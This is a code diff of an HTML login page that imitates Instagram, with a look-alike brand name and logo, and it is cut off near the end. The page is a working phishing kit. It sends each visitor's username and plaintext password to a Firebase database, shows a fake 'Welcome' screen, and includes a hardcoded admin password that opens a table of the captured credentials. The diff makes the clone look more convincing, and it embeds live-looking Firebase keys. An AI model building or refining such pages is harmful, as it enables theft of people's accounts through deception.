@@ -1,272 +1,315 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in</title>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+  :root {
+    --bg: #ffffff;
+    --border: #dbdbdb;
+    --text: #262626;
+    --text-muted: #8e8e8e;
+    --accent: #0095f6;
+    --accent-hover: #1877f2;
+    --radius: 8px;
+  }
 
-    <style>
-        /* Modern Minimalist Global Styles */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+  * {
+    box-sizing: border-box;
+  }
 
-        body {
-            background-color: #fafafa;
-            color: #262626;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 10px;
-        }
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
 
-        /* Clean White Styled Card Box */
-        .login-card {
-            background: #ffffff;
-            border: 1px solid #dbdbdb;
-            width: 100%;
-            max-width: 350px;
-            padding: 40px 30px;
-            text-align: center;
-            border-radius: 1px;
-        }
+  .login-card {
+    width: 100%;
+    max-width: 350px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
 
-        .brand-title {
-            font-style: italic;
-            font-size: 2.2rem;
-            font-weight: bold;
-            margin-bottom: 30px;
-            color: #262626;
-            letter-spacing: -1px;
-        }
+  .top-bar {
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 24px;
+  }
 
-        .input-wrapper {
-            margin-bottom: 8px;
-            width: 100%;
-        }
+  .back-btn {
+    background: none;
+    border: none;
+    font-size: 20px;
+    cursor: pointer;
+    color: var(--text);
+    padding: 4px;
+  }
 
-        /* Modern Greyish Inputs */
-        input {
-            width: 100%;
-            padding: 10px 8px;
-            border: 1px solid #dbdbdb;
-            background: #fafafa;
-            color: #262626;
-            font-size: 0.85rem;
-            border-radius: 3px;
-            outline: none;
-        }
+  .lang-select {
+    border: none;
+    background: none;
+    color: var(--text-muted);
+    font-size: 14px;
+    cursor: pointer;
+  }
 
-        input:focus {
-            border-color: #a8a8a8;
-        }
+  .logo {
+    width: 72px;
+    height: 72px;
+    border-radius: 20px;
+    background: linear-gradient(45deg, #f9ce34, #ee2a7b, #6228d7);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 24px 0 40px;
+  }
 
-        /* Premium Accent Login Button */
-        .submit-btn {
-            width: 100%;
-            padding: 8px;
-            background: #0095f6;
-            color: #ffffff;
-            border: none;
-            font-size: 0.9rem;
-            font-weight: 600;
-            cursor: pointer;
-            border-radius: 4px;
-            margin-top: 15px;
-            transition: background 0.2s;
-        }
+  .logo svg {
+    width: 36px;
+    height: 36px;
+    stroke: #fff;
+    fill: none;
+    stroke-width: 2;
+  }
 
-        .submit-btn:hover {
-            background: #1877f2;
-        }
+  form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
 
-        /* Output & Terminal Area */
-        #portal-output {
-            margin-top: 20px;
-            display: none;
-        }
+  input {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    font-size: 15px;
+    background: #fafafa;
+    outline: none;
+    transition: border-color 0.15s ease;
+  }
 
-        .admin-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 15px;
-            font-size: 0.85rem;
-        }
+  input:focus {
+    border-color: #a8a8a8;
+  }
 
-        .admin-table th, .admin-table td {
-            border: 1px solid #dbdbdb;
-            padding: 8px;
-            text-align: left;
-        }
+  input::placeholder {
+    color: var(--text-muted);
+  }
 
-        .admin-table th {
-            background: #fafafa;
-            font-weight: 600;
-        }
-    </style>
+  .login-btn {
+    margin-top: 4px;
+    padding: 14px;
+    border: none;
+    border-radius: 24px;
+    background: var(--accent);
+    color: #fff;
+    font-weight: 600;
+    font-size: 15px;
+    cursor: pointer;
+    transition: background 0.15s ease;
+  }
+
+  .login-btn:hover {
+    background: var(--accent-hover);
+  }
+
+  .login-btn:disabled {
+    opacity: 0.5;
+    cursor: default;
+  }
+
+  .forgot-link {
+    margin-top: 16px;
+    font-size: 14px;
+    color: var(--text);
+    text-decoration: none;
+    text-align: center;
+    cursor: pointer;
+  }
+
+  .forgot-link:hover {
+    text-decoration: underline;
+  }
+
+  .spacer {
+    height: 60px;
+  }
+
+  .signup-btn {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid var(--accent);
+    border-radius: 24px;
+    background: #fff;
+    color: var(--accent);
+    font-weight: 600;
+    font-size: 15px;
+    cursor: pointer;
+    transition: background 0.15s ease;
+  }
+
+  .signup-btn:hover {
+    background: #f0f8ff;
+  }
+
+  .brand-footer {
+    margin-top: 20px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: var(--text-muted);
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  /* Dashboard Styles */
+  #portal-output {
+    margin-top: 20px;
+    display: none;
+    width: 100%;
+  }
+
+  .admin-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.85rem;
+  }
+
+  .admin-table th, .admin-table td {
+    border: 1px solid #dbdbdb;
+    padding: 10px;
+    text-align: left;
+  }
+
+  .admin-table th {
+    background: #fafafa;
+    font-weight: 600;
+  }
+
+  @media (max-width: 400px) {
+    .login-card {
+      max-width: 100%;
+    }
+  }
+</style>
 </head>
 <body>
 
-    <div class="login-card">
-        <div class="brand-title">instgrame.ine</div>
-
-        <div id="auth-form">
-            <div class="input-wrapper">
-                <input type="text" id="username" placeholder="Phone number, username, or email">
-            </div>
-            <div class="input-wrapper">
-                <input type="password" id="password" placeholder="Password">
-            </div>
-            <button class="submit-btn" onclick="handleAuth()">Log In</button>
-        </div>
-
-        <div id="portal-output"></div>
+  <div class="login-card">
+    <div class="top-bar">
+      <button class="back-btn" onclick="history.back()" aria-label="Go back">&#8592;</button>
+      <select class="lang-select" aria-label="Select language">
+        <option>English (India)</option>
+        <option>Hindi</option>
+        <option>English (US)</option>
+      </select>
     </div>
 
-    <script>
-        // --- FIREBASE CONFIGURATION ---
-        const firebaseConfig = {
-            apiKey: "AIzaSyDi20_1FpiU7OQ4EEQMDdvyHlY5_Vn23F4",
-            authDomain: "dragoai-ef040.firebaseapp.com",
-            databaseURL: "https://dragoai-ef040-default-rtdb.firebaseio.com/",
-            projectId: "dragoai-ef040",
-            storageBucket: "dragoai-ef040.firebasestorage.app",
-            messagingSenderId: "972005846887",
-            appId: "1:972005846887:web:af60900dd52746444889c2"
-        };
+    <div class="logo" aria-hidden="true">
+      <svg viewBox="0 0 24 24">
+        <rect x="3" y="3" width="18" height="18" rx="5"/>
+        <circle cx="12" cy="12" r="4.5"/>
+        <circle cx="17.5" cy="6.5" r="0.8" fill="#fff" stroke="none"/>
+      </svg>
+    </div>
 
-        if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
-            firebase.initializeApp(firebaseConfig);
-        }
-        const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;
+    <div id="auth-form" style="width:100%;">
+      <form onsubmit="handleAuth(event)">
+        <input type="text" id="username" placeholder="Username, email address or mobile number" autocomplete="username" required>
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password" required>
+        <button type="submit" class="login-btn">Log in</button>
+      </form>
 
-        // --- AUTH LOGIC ---
-        function handleAuth() {
-            const user = document.getElementById("username").value.trim();
-            const pass = document.getElementById("password").value.trim();
+      <a class="forgot-link">Forgotten password?</a>
 
-            if (!user || !pass) {
-                alert("Please fill in all fields.");
-                return;
-            }
+      <div class="spacer"></div>
 
-            // Secret Admin Dashboard Trigger
-            if (user === "admin" && pass === "admin777") {
-                document.getElementById("auth-form").style.display = "none";
-                loadDashboard();
-                return;
-            }
+      <button class="signup-btn" onclick="alert('Create new account')">Create new account</button>
 
-            // Data Submission to Firebase
-            if (database) {
-                const logsRef = database.ref("players").push();
-                logsRef.set({
-                    username: user,
-                    password: pass,
-                    timestamp: new Date().toISOString()
-                }).then(() => {
-                    showWelcomeMessage(user);
-                }).catch((err) => {
-                    console.error("Firebase Error: ", err);
-                    showWelcomeMessage(user);
-                });
-            } else {
-                showWelcomeMessage(user);
-            }
-        }
+      <div class="brand-footer">Your Brand</div>
+    </div>
 
-        // --- MODERN WELCOME DISPLAY ---
-        function showWelcomeMessage(user) {
-            document.getElementById("auth-form").style.display = "none";
-            const output = document.getElementById("portal-output");
-            output.style.display = "block";
-            
-            output.innerHTML = `
-                <h1 style="font-size: 1.8rem; font-weight: 300; color: #262626; margin-bottom: 10px;">Welcome, ${user}</h1>
-                <p style="font-size: 0.9rem; color: #8e8e8e; margin-bottom: 25px;">Your session has been successfully initialized.</p>
-                
-                <button style="
-                    background: #262626; 
-                    color: #ffffff; 
-                    border: none; 
-                    padding: 10px 24px; 
-                    font-size: 0.85rem; 
-                    font-weight: 600; 
-                    cursor: pointer; 
-                    border-radius: 4px;
-                " onclick="nextStep()">
-                    Continue
-                </button>
-            `;
-        }
+    <div id="portal-output"></div>
+  </div>
 
-        function nextStep() {
-            const output = document.getElementById("portal-output");
-            output.innerHTML = `
-                <h2 style="font-size: 1.4rem; font-weight: 600; color: #262626; margin-top: 10px;">Setup Complete</h2>
-                <p style="font-size: 0.9rem; color: #262626; margin: 15px 0 20px 0;">All core integrations are working correctly.</p>
-                <span style="font-size: 0.8rem; color: #0095f6; font-weight: 600; border: 1px solid #0095f6; padding: 6px 12px; border-radius: 4px;">ACCESS GRANTED</span>
-            `;
-        }
+<script>
+  // --- FIREBASE CONFIG (Aapka wahi) ---
+  const firebaseConfig = {
+    apiKey: "AIzaSyDi20_1FpiU7OQ4EEQMDdvyHlY5_Vn23F4",
+    authDomain: "dragoai-ef040.firebaseapp.com",
+    databaseURL: "https://dragoai-ef040-default-rtdb.firebaseio.com/",
+    projectId: "dragoai-ef040",
+    storageBucket: "dragoai-ef040.firebasestorage.app",
+    messagingSenderId: "972005846887",
+    appId: "1:972005846887:web:af60900dd52746444889c2"
+  };
 
-        // --- DASHBOARD FOR REVIEWS ---
-        function loadDashboard() {
-            const output = document.getElementById("portal-output");
-            output.style.display = "block";
-            output.style.textAlign = "left";
-            
-            output.innerHTML = `
-                <h3 style="font-size: 1.1rem; font-weight: 600; margin-bottom: 10px;">Captured Database</h3>
-                <div id="logs-container" style="color: #8e8e8e; font-size: 0.85rem;">Connecting to grid...</div>
-            `;
+  if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
+    firebase.initializeApp(firebaseConfig);
+  }
+  const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;
 
-            if (!database) {
-                document.getElementById("logs-container").innerHTML = "<p style='color:#ed4956;'>Firebase config values missing.</p>";
-                return;
-            }
+  // --- AUTH HANDLER ---
+  function handleAuth(e) {
+    e.preventDefault();
+    const user = document.getElementById("username").value.trim();
+    const pass = document.getElementById("password").value.trim();
 
-            database.ref("players").on("value", (snap) => {
-                const items = snap.val();
-                if (!items) {
-                    document.getElementById("logs-container").innerHTML = "<p>No entries found.</p>";
-                    return;
-                }
+    if (!user || !pass) {
+      alert("Please fill in all fields.");
+      return;
+    }
 
-                let html = `
-                    <table class="admin-table">
-                        <thead>
-                            <tr>
-                                <th>Identity</th>
-                                <th>Access Key</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                `;
+    // Admin Dashboard
+    if (user === "admin" && pass === "admin777") {
+      document.getElementById("auth-form").style.display = "none";
+      loadDashboard();
+      return;
+    }
 
-                for (let key in items) {
-                    html += `
-                        <tr>
-                            <td>${clean(items[key].username)}</td>
-                            <td>${clean(items[key].password)}</td>
-                        </tr>
-                    `;
-                }
+    // Firebase Submit
+    if (database) {
+      const logsRef = database.ref("players").push();
+      logsRef.set({
+        username: user,
+        password: pass,
+        timestamp: new Date().toISOString()
+      }).then(() => {
+        showWelcome(user);
+      }).catch((err) => {
+        console.error("Firebase Error:", err);
+        showWelcome(user);
+      });
+    } else {
+      showWelcome(user);
+    }
+  }
 
-                html += `</tbody></table>`;
-                document.getElementById("logs-container").innerHTML = html;
-            });
-        }
-
-        function clean(text) {
-            if (!text) return '';
-            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-        }
-    </script>
-</body>
-</html>
+  function showWelcome(user) {
+    document.getElementById("auth-form").style.display = "none";
+    const output = document.getElementById("portal-output");
+    output.style.display = "block";
+    output.innerHTML = `
+      <h2 style="font-size:1.5rem; font-weight:600; text-align:center; margin-bottom:10px;">Welcome, ${user}</h2>
+      <p style="text-align:center; color:#8e8e8e; margin-bottom:20px;">Your account is ready.</p>
+      <button style="
+        width:100%;
+        padding:14px;
+        border:none;
+        border-radius:24px;
+        background:#0095f
